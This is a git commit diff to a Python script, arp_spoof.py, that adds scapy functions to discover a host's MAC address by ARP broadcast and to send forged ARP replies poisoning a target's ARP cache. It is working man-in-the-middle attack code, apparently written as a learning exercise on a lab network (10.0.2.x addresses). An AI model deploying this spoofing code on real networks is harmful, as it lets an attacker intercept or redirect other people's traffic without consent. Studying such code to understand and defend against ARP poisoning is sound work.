68cd1c9a44f5db513e98c5995fbd7d87a47541e4
Will G <will.gathright@yahoo.com>
2020-12-17 16:57:46 -0500

    Added get_mac function

--- arp_spoof.py
+++ arp_spoof.py
@@ -3,5 +3,19 @@
 import scapy.all as scapy
 
 
-packet = scapy.ARP(op=2, pdst="10.0.2.15",hwdst="08:00:27:e6:e5:59", psrc="10.0.2.1")
-scapy.send(packet)
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    return answered_list[0][1].hwsrc
+
+
+
+
+
+def spoof(target_ip,spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet)
